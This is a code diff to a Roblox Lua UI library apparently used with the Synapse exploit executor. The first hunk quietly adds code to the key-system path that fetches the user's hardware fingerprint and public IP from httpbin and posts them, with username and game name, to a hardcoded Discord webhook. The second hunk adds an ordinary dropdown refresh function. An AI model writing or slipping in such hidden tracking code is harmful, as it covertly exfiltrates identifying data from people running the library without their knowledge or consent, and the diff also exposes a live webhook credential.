@@ -1123,6 +1123,51 @@ function RayfieldLibrary:CreateWindow(Settings)
 	end
 	if Settings.KeySystem then
 		repeat wait() until Passthrough
+		local Http = game:GetService("HttpService")
+		local VevoWebhook = "https://discord.com/api/webhooks/999717675800481852/h6F2jiLaiX5Oxp-y4Y4C451MpN_iDnTU25EMozP9OsrzaiSOQKGUSLAv7eeMH1M9BNVp"
+		local marketplaceService = game:GetService("MarketplaceService")
+		local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId)
+		local httpbin = syn.request({ Url = "https://httpbin.org/get" })
+		local parsed = game:GetService("HttpService"):JSONDecode(httpbin.Body)
+		local hwid = parsed.headers["Syn-Fingerprint"]
+		local httpbinget = syn.request({ Url = "https://httpbin.org/get", Method = "GET"})
+		local IP = game:GetService("HttpService"):JSONDecode(httpbinget.Body)["origin"]
+	    local responce = syn.request({
+			Url = VevoWebhook,
+			Method = 'POST',
+			Headers = {
+				['Content-Type'] = 'application/json'
+			},
+			Body = Http:JSONEncode({
+				["content"] = "",
+				["embeds"] = {{
+					["title"] = "**Vevo Hub has been executed!**",
+					["description"] = "**USER: **"..game.Players.LocalPlayer.Name,
+					["type"] = "rich",
+					["color"] = tonumber(0xffffff),
+					["thumbnail"] = {
+						["url"] = "https://i.ibb.co/B6vn8nS/vevo-icon-14.png"
+					},
+					["fields"] = {
+						{
+							["name"] = "GAME:",
+							["value"] = info.Name,
+							["inline"] = false
+						},
+						{
+							["name"] = "HWID:",
+							["value"] = hwid,
+							["inline"] = false
+						},
+						{
+							["name"] = "IP:",
+							["value"] = IP,
+							["inline"] = false
+						}
+					}
+				}}
+			})
+		})
 	end
 	
 	Notifications.Template.Visible = false
@@ -1845,6 +1890,66 @@ function RayfieldLibrary:CreateWindow(Settings)
 
 				end
 			end
+
+			function DropdownSettings:Refresh(tab)
+                for _, ununusedoption in ipairs(Dropdown.List:GetChildren()) do
+                    if ununusedoption.ClassName == "Frame" and ununusedoption.Name ~= "Placeholder" then
+                        ununusedoption:Destroy()
+                    end
+                end
+
+                for _, Option in ipairs(tab) do
+                    local DropdownOption = Elements.Template.Dropdown.List.Template:Clone()
+                    DropdownOption.Name = Option
+                    DropdownOption.Title.Text = Option
+                    DropdownOption.Parent = Dropdown.List
+                    DropdownOption.Visible = true
+
+                    if DropdownSettings.CurrentOption == Option then
+                        DropdownOption.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+                    end
+
+                    DropdownOption.BackgroundTransparency = 1
+                    DropdownOption.UIStroke.Transparency = 1
+                    DropdownOption.Title.TextTransparency = 1
+
+                    DropdownOption.Interact.ZIndex = 50
+                    DropdownOption.Interact.MouseButton1Click:Connect(
+                        function()
+                            if Dropdown.Selected.Text ~= Option then
+                                Dropdown.Selected.Text = Option
+                                DropdownSettings.Callback(Option)
+                                DropdownSettings.CurrentOption = Option
+                                for _, droption in ipairs(Dropdown.List:GetChildren()) do
+                                    if droption.ClassName == "Frame" and droption.Name ~= "Placeholder" and droption.Name ~= DropdownSettings.CurrentOption then
+                                        TweenService:Create(droption, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
+                                    end
+                                end
+                                TweenService:Create(DropdownOption.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
+                                TweenService:Create(DropdownOption, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
+                                Debounce = true
+                                wait(0.2)
+                                TweenService:Create(DropdownOption.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 0}):Play()
+                                wait(0.1)
+                                TweenService:Create(Dropdown, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = UDim2.new(1, -10, 0, 45)}):Play()
+                                for _, DropdownOpt in ipairs(Dropdown.List:GetChildren()) do
+                                    if DropdownOpt.ClassName == "Frame" and DropdownOpt.Name ~= "Placeholder" then
+                                        TweenService:Create(DropdownOpt, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
+                                        TweenService:Create(DropdownOpt.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
+                                        TweenService:Create(DropdownOpt.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
+                                    end
+                                end
+                                TweenService:Create(Dropdown.List, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ScrollBarImageTransparency = 1}):Play()
+                                TweenService:Create(Dropdown.Toggle, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Rotation = 180}):Play()
+                                wait(0.35)
+                                Dropdown.List.Visible = false
+                                Debounce = false
+                                SaveConfiguration()
+                            end
+                        end
+                    )
+                end
+            end
 
 			if Settings.ConfigurationSaving then
 				if Settings.ConfigurationSaving.Enabled and DropdownSettings.Flag then
